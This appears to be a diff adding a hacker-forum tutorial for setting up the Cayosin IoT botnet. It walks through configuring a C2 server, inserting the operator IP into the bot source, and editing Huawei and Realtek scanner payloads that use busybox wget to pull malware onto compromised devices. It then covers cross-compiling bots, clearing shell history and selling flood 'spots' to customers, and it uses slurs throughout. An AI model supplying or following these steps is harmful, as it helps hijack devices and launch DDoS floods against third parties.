@@ -1,0 +1,191 @@
+Cayosin setup tutorial cuz kids cant figure this shit out. THIS SHIT IS SO DETAILED IF YOU CANT SET THIS SHIT UP AFTER THIS YOU'RE ACTUALLY RETARDED.
+
+made by switch
+Discord: switch#0775
+InstaGram: @switchnets
+
+Requirements:
+Centos 6.9 x64 	2GB RAM VPS
+Beginners buy one from: digitalocean.com
+Experienced buy one from: why are you asking me for a recommendation? you're "experienced", remember? you should have v good host no ban :DDDDDD
+
+
+Lets get this bread:
+
+Login to your VPS in MobaXTerm or PuTTY and WinSCP (MobaXTerm recommended)
+MobaXTerm Download: https://download.mobatek.net/1112019010310554/MobaXterm_Installer_v11.1.zip
+
+Copy this command and run it in the VPS
+yum update -y; yum install wget python gcc nano screen httpd php -y; service httpd start; ulimit -n 999999
+
+Then run this command below: 
+nano /usr/include/bits/typesizes.h
+
+
+Once this opens, you will see a bunch of text that u probably wont understand, dont worry, im here to help u :DDDDD
+Hold down CTRL on your Keyboard and press V 
+
+You should see a line that says "#define __FD_SETSIZE            1024"
+Use your ARROW  KEYS to navigate to the 1024, change 1024 to 999999
+
+Hold down CTRL, then while holding CTRL press X, then let go of CTRL and X and press Y, then press ENTER.
+Congratz, u have just saved a file in nano :DDDD
+
+
+Now lets change the IPs in the files.
+Download Notepad++ or Sublime Text 3 
+Sublime Text 3 Download: https://download.sublimetext.com/Sublime%20Text%20Build%203200%20x64%20Setup.exe
+
+Go into the "bot" folder and open up the "main.c" file in Sublime Text 3
+Scroll down to line 52, you should see something like this
+
+int hacks[] = {1};//1.2.3.4
+int hacks2[] = {2};
+int hacks3[] = {3};
+int hacks4[] = {4}; 
+int hakai_bp = 89;
+
+You need to change the 1.2.3.4 to your IP, so, say for example your IP is 176.45.24.78, it should now look like this
+
+int hacks[] = {176};//176.45.24.78
+int hacks2[] = {45};
+int hacks3[] = {24};
+int hacks4[] = {78}; 
+int hakai_bp = 89;
+
+NOTE: THE 89 IS THE BOTPORT, YOU CAN CHANGE IT IF YOU WANT, BUT YOU WILL HAVE TO RUN THE FINAL SCREENING COMMAND DIFFERENTLY, MAKE IT EASY ON YOURSELF AND KEEP IT AT 89!
+
+Now, lets get them reps all setup so we can pull big huawei boats:
+Go into the "huawei_scanner.c" file and go down to line 277 and you should see a long payload, scroll to the right until you see the IP, it should be 1.1.1.1
+
+"/bin/busybox wget -g 1.1.1.1 -l /tmp/kh -r /mips;"
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+CHANGE THE 1.1.1.1 TO YOUR SERVER IP
+
+Go into the "realtek_scanner.c" file and go down to line 277 and you should see a long payload, scroll to the right until you see the IP, it should be 1.1.1.1
+
+"cd /var/; wget http://1.1.1.1/mips;""
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+CHANGE THE 1.1.1.1 TO YOUR SERVER IP
+
+OK, last one, go into the "CayosinCNC.c" file and scroll down to line 949, you should see some text like this:
+char *iplookup_host = "1.1.1.1"; // Change to Server IP
+
+CHANGE THE 1.1.1.1 TO YOUR SERVER IP, simple. 
+
+
+WE DO NOT NEED TO CHANGE ANY OTHER IPS!
+
+
+Now we need to Cross Compile so we get some bins so we can hack niggas and infect some big iot devices :DDDD
+Go back into your VPS and run the following command, CHANGE THE 1.1.1.1 TO YOUR SERVER IP
+
+chmod 777 *; gcc bot/*.c -o bp -pthread; rm -rf  bp; python Cayosin.py fff 23.254.161.87 cayosin; rm -rf bot; mv iplookup.php /var/www/html
+
+													^^^^^^CHANGE THIS 1.1.1.1 TO YOUR SERVER IP^^^^^^^
+
+
+OK, IT SHOULD ASK "Open The Gates? Y/n:" PRESS "Y" THEN PRESS ENTER!
+
+IMPORTANT!!!!!!
+Now it will Cross Compile, when it is finished THERE SHOULD BE SOME TEXT SAYING "Your Payload" YOU NEED TO COPY THIS TEXT, YOU WILL NEED IT WHEN YOU SCAN AND LOAD BOTS!
+IMPORTANT!!!!!!
+
+
+Nice, we are nearly done creating ur massive fucking Cayosin botnet, now we need to run this HUGE command here, (dont worry, we dont need to change any IPS in this command)
+
+Simply copy and paste this command into your VPS:
+
+mkdir files; mkdir headers; mv includes.h /root/headers; mv misc.h /root/headers; chmod 777 *; gcc -o cnc CayosinCNC.c -pthread; rm -rf CayosinCNC.c; iptables -F; service iptables stop; rm -rf Cayosin.py; history -c; rm -rf cross-compiler-armv4l cross-compiler-armv5l cross-compiler-armv6l cross-compiler-armv7l cross-compiler-i586 cross-compiler-i686 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-powerpc-440fp cross-compiler-sh4 cross-compiler-sparc cross-compiler-x86_64
+
+oKKKKKKKK WERE NEARLY THEREEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+
+Aight now you want to create your logins file, you cant login to the botnet without logins can you? hHAHAHhhahAHhahAHhahHA
+
+Run this command:
+nano logins.txt
+
+Now, you should see a black screen with some white and black text at the top and bottom, we need to put YOUR superadmin Info in here, and anyone who buys a spot on your net in here. Dont worry, here is a lot of detail for you :DDD
+
+
+*You have the ability to make each account admin/superadmin/common.
+"admin" Gives the ability to add/kick users and force unmute all clients. 
+"superadmin" Gives all regular admin abilities, as well as IP Ban/Unban.
+"common" Only allows the sending of floods, use of Tools and Server Commands.
+
+*You must also select their bot plan.
+"noob" gives control over 0 bots
+"plan1" gives control over 100 bots
+"plan2" gives control over 1000 bots
+"plan3" gives control over 5000 bots
+"all" gives them control over all bots
+
+And their Plan Expiry Date (Format: 00/00/0000) (day/month/year)
+
+
+So, because this is your botnet, we want YOU to have superadmin right? right. lets do that.
+
+Pick a username and password, for this tutorial, my username and password will be "switch" and my password "hacks123"
+
+So, type in your desired username and password into the black text in your VPS. Make sure to give yourself superadmin!
+
+Final outcome:
+root reaperwifi superadmin all 30/12/9999
+
+That line of text means that I am a superadmin, I have control over ALL connected Bots, and my plan will end on the 30th of December, 9999
+
+Now you have typed that in the black box, we need to save it, remember how to do that? No? Here:
+Hold down CTRL, then while holding CTRL press X, then let go of CTRL and X and press Y, then press ENTER.
+You have just saved your logins, now we just need to start the botnet :)
+
+Its really easy and simple. DM me on Discord if you get confused
+
+
+
+Now, lets do the final command, SCREEN THE BOTNET :DDDD
+
+Go back into the VPS, and run the following command:
+screen ./cnc 420 850
+
+
+PLEASE NOTE, IF YOU IGNORED MY ADVICE TO KEEP THAT "89" BOTPORT IN THE "main.c" FILE AT 89 AND CHANGED IT TO SOMETHING ELSE, YOU WILL NEED TO CHANGE THE 89 IN THIS COMMAND TO WHATEVER NUMBER YOU CHOSE.
+If you didnt change the 89 in the "main.c" file, then you dont have to change anything in that command, just run it how it is
+
+
+then press ENTER.
+Once you press enter, you should see something on the screen that says
+==============
+  Cayosin C2
+==============
+
+That means that your botnet is now screened! if it says something like "screen is terminating", DM me on Discord, you probably either ran a command wrong.
+
+Now we need to detach the screen, to do this:
+Hold down CTRL on your Keyboard, then Hold down A and then press D
+
+So CTRL A+D
+
+Now your botnet is screened. Open up PuTTY and connect to it via RAW PORT 747, 
+
+Here is a picture of what it should look like: https://i.imgur.com/aivB0ai.png
+
+Once you have done that, press "Open" and you should see Cayosin asking for your username. Type in the same username you put in the logins.txt. Mine was "switch" and my password was "hacks123"
+
+You should then be greeted with the Cayosin terminal. Type "help" for your available commands
+
+
+BUT WAIT! THERES MORE!
+
+If you wanted to add someone who brought lets say a MONTHLY spot and the date was 13/03/2019. Run the following command:
+
+adduser spotuser spotpass common all 13/04/2019
+
+This line of text means that that user is a common user which only allows the sending of floods, use of Tools and Server Commands. They have access to ALL connected bots, and their plan ends in exactly 1 month.
+
+
+Thanks for reading, if u have any more problems add me on Discord or DM me on Instagram:
+
+Discord: switch#0775
+InstaGram: @switchnets
